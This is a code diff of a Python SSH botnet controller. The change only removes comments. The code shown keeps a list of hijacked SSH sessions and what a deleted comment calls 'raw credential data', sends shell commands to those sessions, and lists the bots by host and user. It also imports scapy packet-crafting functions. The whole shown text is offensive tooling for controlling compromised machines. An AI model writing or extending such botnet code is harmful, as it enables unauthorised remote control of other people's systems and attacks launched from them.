@@ -5,8 +5,8 @@ from colorama import Fore, Style
 from pexpect import pxssh
 from scapy.all import IP, TCP, send
 
-botnet = []  # Active SSH session objects
-bot_data = []  # Raw credential data
+botnet = []  
+bot_data = []  
 connected_hosts = set()
 
 # ------------------------ SSH Functions ------------------------
@@ -31,7 +31,7 @@ def connect_ssh(host, user, password, port=22, save=True):
 def send_command(session, cmd):
     session.sendline(cmd)
     session.prompt()
-    return session.before.decode().split("\n", 1)[1]  # Skip command echo
+    return session.before.decode().split("\n", 1)[1]  
 
 # ------------------------ Botnet Management ------------------------
 
@@ -45,7 +45,7 @@ def list_bots():
         host = bot.get("host")
         user = bot.get("user")
         port = bot.get("port", 22)
-        session_id = id(session)  # Unique ID of the pxssh object in memory
+        session_id = id(session)  
 
         print(f"[{i}] Host: {host} | User: {user} | Port: {port} | Session ID: {session_id}")
 
